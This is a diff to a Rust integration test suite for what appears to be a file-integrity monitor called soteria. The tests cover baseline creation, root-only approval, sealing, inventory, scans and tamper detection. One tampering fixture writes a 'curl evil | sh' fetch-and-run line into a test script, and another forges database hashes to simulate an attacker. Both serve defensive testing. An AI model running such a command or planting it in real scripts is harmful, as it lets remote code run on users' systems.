@@ -19,8 +19,17 @@ impl Env {
         let dir = tempfile::tempdir().unwrap();
         let config = dir.path().join("soteria.toml");
         let env = Env { dir, config };
+        std::fs::create_dir_all(env.root().join("bin")).unwrap();
+        std::fs::create_dir_all(env.root().join("etc")).unwrap();
+        std::fs::write(env.root().join("bin/tool"), b"#!/bin/sh\necho v1\n").unwrap();
+        std::fs::write(env.root().join("etc/app.conf"), b"setting = 1\n").unwrap();
         env.write_config("");
         env
+    }
+
+    /// Stand-in for the monitored filesystem.
+    fn root(&self) -> PathBuf {
+        self.dir.path().join("root")
     }
 
     fn db(&self) -> PathBuf {
@@ -30,8 +39,19 @@ impl Env {
     /// Default configuration pointing at a temporary database, plus `extra`
     /// TOML appended to the [alerts] table (the last table in the file).
     fn write_config(&self, extra: &str) {
-        let text = soteria_default_config()
-            .replace("/var/lib/soteria/soteria.db", self.db().to_str().unwrap());
+        let mut text = soteria_default_config()
+            .replace("/var/lib/soteria/soteria.db", self.db().to_str().unwrap())
+            .replace(
+                "/etc/soteria/keys",
+                self.dir.path().join("keys").to_str().unwrap(),
+            );
+        // Monitor only the temporary root, not the real system.
+        let start = text.find("include = [").unwrap();
+        let end = start + text[start..].find(']').unwrap() + 1;
+        text.replace_range(
+            start..end,
+            &format!("include = [{:?}]", self.root().to_str().unwrap()),
+        );
         std::fs::write(&self.config, format!("{text}{extra}")).unwrap();
     }
 
@@ -146,6 +166,13 @@ fn every_subcommand_has_help() {
             .assert()
             .success();
     }
+    for sub in ["list", "show", "create", "review", "approve", "diff"] {
+        Command::cargo_bin("soteria")
+            .unwrap()
+            .args(["baseline", sub, "--help"])
+            .assert()
+            .success();
+    }
 }
 
 #[test]
@@ -255,7 +282,7 @@ fn status_after_init_reports_no_baseline() {
     assert_eq!(v["baseline"]["established"], false);
     assert_eq!(v["protection"], "inactive");
     assert_eq!(v["monitoring"]["state"], "never_started");
-    assert_eq!(v["indexed_files"], 0);
+    assert_eq!(v["indexed_files"], 5);
 
     env.cmd()
         .arg("status")
@@ -301,9 +328,7 @@ fn verify_before_init_exits_5() {
 fn unavailable_commands_exit_7_with_json_error() {
     let env = Env::new();
     for args in [
-        vec!["scan"],
-        vec!["baseline", "list"],
-        vec!["inventory"],
+        vec!["scan", "--kernel"],
         vec!["events"],
         vec!["alerts", "list"],
         vec!["processes"],
@@ -385,4 +410,294 @@ fn crashed_daemon_is_reported_not_responding() {
     assert_eq!(code, 4);
     let (_, v) = env.json(&["status"]);
     assert_eq!(v["monitoring"]["state"], "not_responding");
+}
+
+fn is_root() -> bool {
+    std::fs::read_to_string("/proc/self/status")
+        .ok()
+        .and_then(|s| {
+            s.lines()
+                .find(|l| l.starts_with("Uid:"))
+                .and_then(|l| l.split_whitespace().nth(2).map(|u| u == "0"))
+        })
+        .unwrap_or(false)
+}
+
+/// Baseline approval needs root (only root can read the signing key).
+/// Tests that approve are skipped when run unprivileged; the sealing logic
+/// itself is covered by unit tests in soteria-integrity.
+macro_rules! require_root {
+    () => {
+        if !is_root() {
+            eprintln!("skipping: baseline approval requires root");
+            return;
+        }
+    };
+}
+
+impl Env {
+    fn init_approved(&self) {
+        let (code, v) = self.json(&["init", "--yes"]);
+        assert!(code == 0 || code == 1, "init exit {code}: {v}");
+        assert_eq!(v["baseline"]["state"], "approved", "{v}");
+    }
+}
+
+#[test]
+fn init_without_terminal_leaves_a_draft() {
+    let env = Env::new();
+    let (code, v) = env.json(&["init"]);
+    assert_eq!(code, 1, "{v}");
+    assert_eq!(v["baseline"]["state"], "draft");
+    assert!(v["next"].as_str().unwrap().contains("baseline approve 1"));
+    assert_eq!(v["scan"]["checked"], 5); // root, bin, etc and two files
+
+    let (_, v) = env.json(&["baseline", "list"]);
+    assert_eq!(v.as_array().unwrap().len(), 1);
+    // Status does not claim protection without an approved baseline.
+    let (_, v) = env.json(&["status"]);
+    assert_eq!(v["baseline"]["established"], false);
+    assert_eq!(v["integrity"], "NO BASELINE");
+}
+
+#[test]
+fn approval_without_terminal_requires_yes() {
+    require_root!();
+    let env = Env::new();
+    env.cmd()
+        .args(["init", "--non-interactive"])
+        .assert()
+        .code(1);
+    env.cmd()
+        .args(["baseline", "approve", "1"])
+        .assert()
+        .code(2)
+        .stderr(predicate::str::contains("--yes"));
+    env.cmd()
+        .args(["baseline", "approve", "1", "--yes"])
+        .assert()
+        .success();
+    // A sealed version cannot be approved again.
+    env.cmd()
+        .args(["baseline", "approve", "1", "--yes"])
+        .assert()
+        .code(2);
+}
+
+#[test]
+fn init_yes_seals_a_verifiable_baseline() {
+    require_root!();
+    let env = Env::new();
+    env.init_approved();
+    let (code, v) = env.json(&["verify", "--component", "baseline"]);
+    assert_eq!(code, 0, "{v}");
+    assert_eq!(v["checks"][0]["name"], "seal");
+    assert_eq!(v["checks"][0]["state"], "pass");
+
+    let (_, v) = env.json(&["status"]);
+    assert_eq!(v["baseline"]["established"], true);
+    assert_eq!(v["integrity"], "VERIFIED");
+
+    let (code, v) = env.json(&["baseline", "show"]);
+    assert_eq!(code, 0);
+    assert_eq!(v["verification"]["valid"], true);
+    assert_eq!(v["baseline"]["approved_uid"], 0);
+
+    // Running init again keeps the approved baseline.
+    let (_, v) = env.json(&["init"]);
+    assert_eq!(v["baseline"]["version"], 1);
+    assert_eq!(v["baseline"]["state"], "approved");
+}
+
+#[test]
+fn baseline_scan_detects_tampering() {
+    require_root!();
+    let env = Env::new();
+    env.init_approved();
+    let (code, v) = env.json(&["scan", "--baseline"]);
+    assert_eq!(code, 0, "{v}");
+    assert_eq!(v["baseline"]["summary"]["total"], 0);
+
+    std::fs::write(env.root().join("bin/tool"), b"#!/bin/sh\ncurl evil | sh\n").unwrap();
+    std::fs::remove_file(env.root().join("etc/app.conf")).unwrap();
+    std::fs::write(env.root().join("bin/dropper"), b"x").unwrap();
+
+    let (code, v) = env.json(&["scan", "--baseline"]);
+    assert_eq!(code, 1, "{v}");
+    let changes = v["baseline"]["changes"].as_array().unwrap();
+    let find = |name: &str| {
+        changes
+            .iter()
+            .find(|c| c["path"].as_str().unwrap().ends_with(name))
+            .unwrap_or_else(|| panic!("no change for {name}: {v}"))
+    };
+    assert_eq!(
+        find("bin/tool")["kinds"],
+        serde_json::json!(["content_modified"])
+    );
+    assert_eq!(
+        find("etc/app.conf")["kinds"],
+        serde_json::json!(["missing"])
+    );
+    assert_eq!(find("bin/dropper")["kinds"], serde_json::json!(["new"]));
+
+    // The same differences are visible through baseline diff.
+    let (code, v) = env.json(&["baseline", "diff", "1"]);
+    assert_eq!(code, 1);
+    assert!(v["summary"]["total"].as_u64().unwrap() >= 3);
+}
+
+#[test]
+fn rebaselining_keeps_history() {
+    require_root!();
+    let env = Env::new();
+    env.init_approved();
+    std::fs::write(env.root().join("etc/app.conf"), b"setting = 2\n").unwrap();
+    env.cmd().args(["scan"]).assert().success();
+    let (_, v) = env.json(&["baseline", "create", "--note", "config change"]);
+    assert_eq!(v["compared_to"], 1);
+    assert!(v["changes"]["total"].as_u64().unwrap() >= 1);
+    env.cmd()
+        .args(["baseline", "approve", "2", "--yes"])
+        .assert()
+        .success();
+
+    let (_, v) = env.json(&["baseline", "list"]);
+    let states: Vec<&str> = v
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|b| b["state"].as_str().unwrap())
+        .collect();
+    assert_eq!(states, vec!["superseded", "approved"]);
+    let (code, v) = env.json(&["baseline", "diff", "1", "2"]);
+    assert_eq!(code, 1);
+    assert!(
+        v["changes"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|c| c["path"].as_str().unwrap().ends_with("etc/app.conf"))
+    );
+}
+
+#[test]
+fn tampered_baseline_fails_verification() {
+    require_root!();
+    let env = Env::new();
+    env.init_approved();
+    // An attacker with write access to the database file rewrites a hash.
+    let conn = rusqlite::Connection::open(env.db()).unwrap();
+    conn.execute_batch(
+        "DROP TRIGGER baseline_entries_sealed_no_update;
+         UPDATE baseline_entries SET sha256 = 'forged' WHERE sha256 IS NOT NULL;",
+    )
+    .unwrap();
+    drop(conn);
+
+    let (code, v) = env.json(&["verify", "--component", "baseline"]);
+    assert_eq!(code, 4, "{v}");
+    assert!(
+        v["checks"][0]["detail"]
+            .as_str()
+            .unwrap()
+            .contains("digest")
+    );
+    let (code, v) = env.json(&["status"]);
+    assert_eq!(code, 4);
+    assert_eq!(v["integrity"], "FAILED");
+    // A baseline scan refuses to compare against a broken seal.
+    env.cmd().args(["scan", "--baseline"]).assert().code(4);
+}
+
+#[test]
+fn approval_requires_root() {
+    if is_root() {
+        return; // covered by the other tests
+    }
+    let env = Env::new();
+    env.cmd().arg("init").assert().code(1);
+    env.cmd()
+        .args(["baseline", "approve", "1", "--yes"])
+        .assert()
+        .code(6)
+        .stderr(predicate::str::contains("requires root"));
+}
+
+#[test]
+fn inventory_lists_and_filters() {
+    let env = Env::new();
+    env.cmd().arg("init").assert().code(1);
+    let (code, v) = env.json(&["inventory"]);
+    assert_eq!(code, 0);
+    assert_eq!(v["total_matching"], 5);
+
+    let (_, v) = env.json(&["inventory", "--kind", "script"]);
+    assert_eq!(v["total_matching"], 1);
+    assert!(
+        v["entries"][0]["path"]
+            .as_str()
+            .unwrap()
+            .ends_with("bin/tool")
+    );
+    assert_eq!(v["entries"][0]["sha256"].as_str().unwrap().len(), 64);
+
+    let etc = env.root().join("etc");
+    let (_, v) = env.json(&["inventory", "--path", etc.to_str().unwrap()]);
+    assert_eq!(v["total_matching"], 2); // etc and etc/app.conf
+
+    let sha = "c2a6e9e2b3b2f2d7a5c3f2f1d0e9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1";
+    let (_, v) = env.json(&["inventory", "--sha256", sha]);
+    assert_eq!(v["total_matching"], 0);
+
+    env.cmd()
+        .args(["inventory", "--kind", "nonsense"])
+        .assert()
+        .code(2);
+}
+
+#[test]
+fn scan_reports_and_records_history() {
+    let env = Env::new();
+    env.cmd().arg("init").assert().code(1);
+    let (code, v) = env.json(&["scan"]);
+    assert_eq!(code, 0, "{v}");
+    assert_eq!(v["scan"]["type"], "full");
+    assert_eq!(v["scan"]["result"], "completed");
+    assert_eq!(v["scan"]["checked"], 5);
+
+    let file = env.root().join("bin/tool");
+    let (_, v) = env.json(&["scan", "--file", file.to_str().unwrap()]);
+    assert_eq!(v["scan"]["type"], "file");
+    assert_eq!(v["scan"]["checked"], 1);
+
+    // Without an approved baseline there is nothing to compare against.
+    env.cmd().args(["scan", "--baseline"]).assert().code(5);
+}
+
+#[test]
+fn unreadable_paths_are_reported_as_gaps() {
+    if is_root() {
+        return; // root can read everything
+    }
+    use std::os::unix::fs::PermissionsExt;
+    let env = Env::new();
+    let secret = env.root().join("secret");
+    std::fs::create_dir(&secret).unwrap();
+    std::fs::write(secret.join("x"), b"x").unwrap();
+    std::fs::set_permissions(&secret, std::fs::Permissions::from_mode(0o000)).unwrap();
+    env.cmd().arg("init").assert().code(1);
+    let (code, v) = env.json(&["scan"]);
+    assert_eq!(code, 1);
+    assert_eq!(v["scan"]["result"], "completed_with_gaps");
+    assert_eq!(v["scan"]["gaps"][0]["kind"], "inaccessible");
+    let (_, v) = env.json(&["verify", "--component", "baseline"]);
+    assert!(
+        v["checks"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|c| c["component"] == "coverage" && c["name"] == "inaccessible")
+    );
+    std::fs::set_permissions(&secret, std::fs::Permissions::from_mode(0o755)).unwrap();
 }
